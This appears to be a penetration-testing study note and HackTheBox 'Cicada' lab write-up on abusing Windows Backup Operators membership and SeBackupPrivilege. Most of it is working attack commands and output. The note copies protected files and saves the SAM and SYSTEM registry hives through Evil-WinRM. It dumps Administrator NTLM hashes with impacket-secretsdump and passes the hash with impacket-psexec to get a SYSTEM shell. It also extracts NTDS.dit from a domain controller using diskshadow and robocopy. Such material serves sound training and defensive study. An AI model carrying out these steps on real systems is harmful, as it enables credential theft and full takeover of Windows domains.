# Windows Built-in Groups


## 🏢 Windows Built-in Groups

- Windows servers and Domain Controllers have **built-in groups** that grant special rights.
- These groups exist from Server 2008 R2 onward (except Hyper-V Admins from Server 2012).
- Group membership often gives privileges useful for specific tasks (e.g., backup, printing).
- Sometimes service accounts or vendor apps are members.
- Always check group membership to identify possible privilege escalation paths.


### Important Groups to Know:
- **Backup Operators**
- Event Log Readers
- DnsAdmins
- Hyper-V Administrators
- Print Operators
- Server Operators


## 💼 Backup Operators Group & SeBackupPrivilege

- Being in **Backup Operators** gives two key privileges:
  - **SeBackupPrivilege**: Backup files/folders (read anything).
  - **SeRestorePrivilege**: Restore files/folders.

- **SeBackupPrivilege** lets you read and copy files **even if ACL denies access**.


## 🧪 Using SeBackupPrivilege to Copy Protected Files


### Step 1: Check Your Group Membership

```powershell
whoami /groups
```

Look for membership in **Backup Operators**.


### Step 2: Check if SeBackupPrivilege is Enabled

```powershell
whoami /priv
Get-SeBackupPrivilege
```

If `SeBackupPrivilege` is **Disabled**, enable it:

```powershell
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

*Note:* You may need an **elevated (admin) command prompt**.


### Step 3: Copy a Protected File Using SeBackupPrivilege Cmdlet

Example: The file `C:\Confidential\2021 Contract.txt` is denied for normal reading.

```powershell
cat 'C:\Confidential\2021 Contract.txt'
# Access denied error

Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
cat .\Contract.txt
# File content is now readable
```

## OR  copy using robocopy
```
robocopy "C:\Users\Administrator\Desktop" "C:\Temp" "root.txt" /B
```
# Window Registery (Administrator hash)
SeBackupPrivilege is an instant win. We can copy the sam and system registry values and pass the Administrator hash.
```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> reg save hklm\system C:\temp\system.hive 
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> reg save hklm\sam C:\temp\sam.hive
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd C:\temp
*Evil-WinRM* PS C:\temp> download sam.hive
                                        
Info: Downloading C:\temp\sam.hive to sam.hive
                                        
Info: Download successful!
*Evil-WinRM* PS C:\temp> download system.hive
                                        
Info: Downloading C:\temp\system.hive to system.hive
                                        
Info: Download successful!
*Evil-WinRM* PS C:\temp>
```
Now back at the attacker, I can use `impacket-secretsdump` to well, dump the secrets.
```
┌──(kali㉿kali)-[~/…/htb/writeups/cicada/loot]
└─$ impacket-secretsdump -sam sam.hive -system system.hive local
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Cleaning up...
```

Thanks to windows and it's silliness, I can just pass the administrator hash using impacket-psexec and have a shell as system.

```
┌──(kali㉿kali)-[~/…/htb/writeups/cicada/loot]
└─$ impacket-psexec cicada.htb/Administrator@10.129.198.41 -hashes 'aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.198.41.....
[*] Found writable share ADMIN$
[*] Uploading file DgNSqBjx.exe
[*] Opening SVCManager on 10.129.198.41.....
[*] Creating service RURf on 10.129.198.41.....
[*] Starting service RURf.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2700]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```



___
# Attacking a Domain Controller with SeBackupPrivilege


### Why Target the Domain Controller?

- The **NTDS.dit** file contains the Active Directory database with all user and computer hashes.
- It is **locked** and inaccessible normally.


### Step 1: Create a Shadow Copy with DiskShadow

```powershell
diskshadow.exe

# Inside diskshadow console:
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit
```

Now `E:` is a snapshot of the `C:` drive, including the NTDS.dit file.


### Step 2: Copy NTDS.dit Locally Using SeBackupPrivilege

```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```


### Step 3: Back Up SAM and SYSTEM Registry Hives

```powershell
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

These files can be used to extract local account credentials offline.


## 🔍 Extracting Credentials

- Use tools like **DSInternals PowerShell** or **Impacket secretsdump.py**.

### DSInternals example:

```powershell
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=domain,DC=local' -DBPath .\ntds.dit -BootKey $key
```


### secretsdump.py example:

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

This extracts NTLM hashes which can be cracked offline or used in pass-the-hash attacks.


## 🛠 Using Robocopy in Backup Mode

Instead of external tools, use **robocopy** with the `/B` (backup mode) flag to copy locked files.

```powershell
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

This copies the `ntds.dit` file from the shadow copy.
